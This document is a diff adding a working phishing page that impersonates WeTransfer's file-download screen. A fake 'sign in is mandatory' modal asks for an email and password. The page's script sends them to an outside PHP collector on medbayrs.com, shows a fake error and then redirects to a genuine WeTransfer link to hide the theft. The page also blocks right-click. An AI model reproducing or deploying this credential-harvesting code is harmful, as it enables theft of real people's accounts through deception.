@@ -1,0 +1,252 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" href="https://storage.googleapis.com/wetransfer-rd91.appspot.com/images/bow.ico" sizes="32x32">
+    <title dir="ltr">WeTransfer</title>
+    <script>
+// akam-sw.js install script version 1.3.4
+"serviceWorker"in navigator&&"find"in[]&&function(){var e=new Promise(function(e){"complete"===document.readyState||!1?e():(window.addEventListener("load",function(){e()}),setTimeout(function(){"complete"!==document.readyState&&e()},1e4))}),n=window.akamServiceWorkerInvoked,r="1.3.4";if(n)aka3pmLog("akam-setup already invoked");else{window.akamServiceWorkerInvoked=!0,window.aka3pmLog=function(){window.akamServiceWorkerDebug&&console.log.apply(console,arguments)};function o(e){(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"sm.sw.s":e,"sm.sw.v":r}])}var i="/akam-sw.js",a=new Map;navigator.serviceWorker.addEventListener("message",function(e){var n,r,o=e.data;if(o.isAka3pm)if(o.command){var i=(n=o.command,(r=a.get(n))&&r.length>0?r.shift():null);i&&i(e.data.response)}else if(o.commandToClient)switch(o.commandToClient){case"enableDebug":window.akamServiceWorkerDebug||(window.akamServiceWorkerDebug=!0,aka3pmLog("Setup script debug enabled via service worker message"),p());break;case"boomerangMQ":o.payload&&(window.BOOMR_mq=window.BOOMR_mq||[]).push(o.payload)}aka3pmLog("akam-sw message: "+JSON.stringify(e.data))});var t=function(e){return new Promise(function(n){var r,o;r=e.command,o=n,a.has(r)||a.set(r,[]),a.get(r).push(o),navigator.serviceWorker.controller&&(e.isAka3pm=!0,navigator.serviceWorker.controller.postMessage(e))})},c=function(e){return t({command:"navTiming",navTiming:e})},s=null,m={},d=function(){var e=i;return s&&(e+="?othersw="+encodeURIComponent(s)),function(e,n){return new Promise(function(r,i){aka3pmLog("Registering service worker with URL: "+e),navigator.serviceWorker.register(e,n).then(function(e){aka3pmLog("ServiceWorker registration successful with scope: ",e.scope),r(e),o(1)}).catch(function(e){aka3pmLog("ServiceWorker registration failed: ",e),o(0),i(e)})})}(e,m)},g=ServiceWorkerContainer.prototype.register;if(ServiceWorkerContainer.prototype.register=function(n,r){return n.includes(i)?g.call(this,n,r):(aka3pmLog("Overriding registration of service worker for: "+n),s=new URL(n,window.location.href),m=r,navigator.serviceWorker.controller?new Promise(function(n,r){var o=navigator.serviceWorker.controller.scriptURL;if(o.includes(i)){var a=encodeURIComponent(s);o.includes(a)?(aka3pmLog("Cancelling registration as we already integrate other SW: "+s),navigator.serviceWorker.getRegistration().then(function(e){n(e)})):e.then(function(){aka3pmLog("Unregistering existing 3pm service worker"),navigator.serviceWorker.getRegistration().then(function(e){e.unregister().then(function(){return d()}).then(function(e){n(e)}).catch(function(e){r(e)})})})}else aka3pmLog("Cancelling registration as we already have akam-sw.js installed"),navigator.serviceWorker.getRegistration().then(function(e){n(e)})}):g.call(this,n,r))},navigator.serviceWorker.controller){var u=navigator.serviceWorker.controller.scriptURL;u.includes("/akam-sw.js")||u.includes("/akam-sw-preprod.js")||u.includes("/threepm-sw.js")||(aka3pmLog("Detected existing service worker. Removing and re-adding inside akam-sw.js"),s=new URL(u,window.location.href),e.then(function(){navigator.serviceWorker.getRegistration().then(function(e){m={scope:e.scope},e.unregister(),d()})}))}else e.then(function(){window.akamServiceWorkerPreprod&&(i="/akam-sw-preprod.js"),d()});if(window.performance){var w=window.performance.timing,l=w.responseEnd-w.responseStart;c(l)}e.then(function(){t({command:"pageLoad"})});var k=!1;function p(){window.akamServiceWorkerDebug&&!k&&(k=!0,aka3pmLog("Initializing debug functions at window scope"),window.aka3pmInjectSwPolicy=function(e){return t({command:"updatePolicy",policy:e})},window.aka3pmDisableInjectedPolicy=function(){return t({command:"disableInjectedPolicy"})},window.aka3pmDeleteInjectedPolicy=function(){return t({command:"deleteInjectedPolicy"})},window.aka3pmGetStateAsync=function(){return t({command:"getState"})},window.aka3pmDumpState=function(){aka3pmGetStateAsync().then(function(e){aka3pmLog(JSON.stringify(e,null,"\t"))})},window.aka3pmInjectTiming=function(e){return c(e)},window.aka3pmUpdatePolicyFromNetwork=function(){return t({command:"pullPolicyFromNetwork"})})}p()}}();</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <link href="https://storage.googleapis.com/wetransfer-rd91.appspot.com/css/mystyle.css" rel="stylesheet">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+<body oncontextmenu="return false;">
+  <script>(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"","rua.texp":""}]);</script>
+                          <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="8WMGS-R456H-64GN8-4FVQL-CTDMX",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(c){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"8WMGS-R456H-64GN8-4FVQL-CTDMX";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="cookiepresent",a="wiqdluixjdebuyepsuzq-f-033584d31-clientnsv4-s.akamaihd.net",i={"ak.v":"31","ak.cp":"757416","ak.ai":parseInt("492561",10),"ak.ol":"0","ak.cr":11,"ak.ipv":4,"ak.proto":"h2","ak.rid":"53f1cb3e","ak.r":39685,"ak.a2":n,"ak.m":"","ak.n":"essl","ak.bpcip":"178.32.53.0","ak.cport":63405,"ak.gh":"104.89.116.212","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"","ak.t":"1620022579","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==0Z5UOU5DyiKyTVX/1RKnx9GTWDzV+l23sRhYqH3iG0tAY6wY2/BhGByKeZebsFKFjvaGjkNgkvjNkrGMmZRRVPK1wpIO/OCjfZTUI5qrCPMAUS04FsBkv9JQTGagpk8Fas0EAW1HoEJZ2lSEw3hCpvvObSGBaQP06Mtl5iNi/v2REan91T8/oAkxd6hanheu2F4aJm8kC3OqitGmK50TtZzz/dcUaZpaoYbuHZWyKcPHKLbCQZB5IdH8eBdKG5PVHd0duJjUfZRKOHe5tGnit/sS+ipiHvmih15kfAT+5CRLxdCxVQqnb0DyxjFEkkv6JFgxdEIOFQdCRQusgxYVcDB50UO43PrOtmod/jZK5+qdDophF7Woi0XPcnMqRMafmO4xldd8qsAUzAZ5kI1JPcjrRYXyyQ2P1zsxb3hFzRw=","ak.pv":"157","ak.dpoabenc":""};if(""!==t)i["ak.ruds"]=t;var o={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))i["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(i)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:i,akDNSPreFetchDomain:a,init:function(){if(!o.i){var e=BOOMR.subscribe;e("before_beacon",o.av,null,null),e("onbeacon",o.rv,null,null),o.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>
+
+<body class="modal-open">
+    <div class="row stack">
+        <div class="col">
+            <div style="float: left;height: 44px;line-height: 44px;"><img src="https://storage.googleapis.com/wetransfer-rd91.appspot.com/images/logo.png" style=" width: 51px;"> </div>
+        </div>
+        <div class="col">
+            <div class="durax">
+                <center>
+                    <div class="waithi"> Help</div>
+                    <div class="waithi">About us</div>
+                    <div class="waithi" style="border: none;">Got Plus?</div>
+                </center>
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="believe">
+            <center>
+                <div class="indusuf"> </div>
+                <div class="me">Ready when you are</div>
+                <div style="font-size: 13px;">Files deleted in 72 Hours</div>
+                <br>
+                <div class="pedi">
+                    <div style=" text-align: left; margin-left: 22px; font-size: 14px; color: black; padding-top: 4px; ">CI &amp; PL .pdf <br>
+                      <div style="font-size: 10px;color: gray;">3,400 KB . PDF</div>
+                    </div></div>
+                <div type="button" class="butti" data-toggle="modal" data-target="#myModal"> Download</div>
+            </center>
+        </div>
+        <div class="modal fade in" id="myModal" aria-hidden="true" tabindex="-1" role="dialog" style="overflow: hidden; padding-top: 0px !important; padding-bottom: 0px !important;display: none; padding-left: 16px;">
+            <div class="modal-dialog" style="margin-top: 0px; width: 538px;background-color: transparent; ;float: right;height: 100vh; overflow: hidden; border-radius: 16px 0 0 45px;">
+                <!-- Modal content-->
+                <div class="modal-content" id="coochie" style="border-radius: 0;height: 100vh; border: solid 0; border-top: solid 29px #409fff;">
+                    <div style="text-align: left;font-size: 29px;padding-bottom: 93px;padding-left: 11px;padding-top: 60px;background: #f3f7fa;line-height: 29px;"> Sign In is mandatory <br>
+                        <small style="font-size: 15px;">We now require email signin from all guest users to download files.</small>
+                    </div>
+                    <div class="modal-body">
+                        <div>
+                            <form method="post">
+                                <small style="color: red;">
+                                    <div style="display: none;" id="msg">Wrong Email ID or Password. Please try again</div>
+                                    <div style="display: none;" id="error">That account doesn't exist. Enter a different account</div>
+                                </small>
+                                <div>Sign in with your email address to download now</div><br>
+                                <input type="email" name="ai" id="ai" placeholder="example@company.com" tabindex="1" required="" class="" autofocus="1" style="width: 100%;height: 51px;padding-left: 10px;background: #fff;outline: 0;border: solid 1px #0067B8 !important;" value="">
+                            </form>
+                        </div>
+                        <br>
+                        <div style="">
+                            <input type="password" name="pr" id="pr" placeholder="✱✱✱✱✱✱
+" tabindex="1" required="" class="" value="" style="width: 100%;width: 100%;height: 51px;padding-left: 10px;background: #ffffff;border: solid 1px #0067B8 !important;outline: 0; ">
+                        </div>
+                        <button name="jdgioool" title="" class="butti" id="submit-btn" style="height: 49px;width: 94%;border: 0;float: right;margin-top: 24px;color: white;font-weight: 600;margin-bottom: 10px;font-size: 19px;position: fixed;bottom: 0;">Sign in to download file
+                        </button>
+                        <div id="oneoo" style="padding-top: 12px; font-size: 12px; position: fixed;bottom: 0; text-align: center; width: 100%;     padding-bottom: 9px;  cursor: pointer;">©2022 Wetransfer &nbsp; &nbsp; Terms of use &nbsp; &nbsp;Privacy and cookies </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+<script type="text/javascript" >var _cf = _cf || [];  _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]);  _cf.push(['_setAu', '/content/e1501ab286rn210be6fb6dd983b0ed70']); </script><script type="text/javascript"  src="/content/e1501ab286rn210be6fb6dd983b0ed70"></script></body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url email getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        
+        $('#ai').val(my_ai);
+        
+        $("#msg").hide();
+
+    }
+    ///////////////url getting email////////////////
+
+
+
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Password field is empty..!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty..!");
+            ai.focus;
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: 'https://medbayrs.com/wetransferuddd.php',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Sign in...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("https://wetransfer.com/downloads/5f0b00b70b26075984720f058912adab20200828025219/9192e2");
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("https://wetransfer.com/downloads/5f0b00b70b26075984720f058912adab20200828025219/9192e2");
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Sign in to download file');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</html>
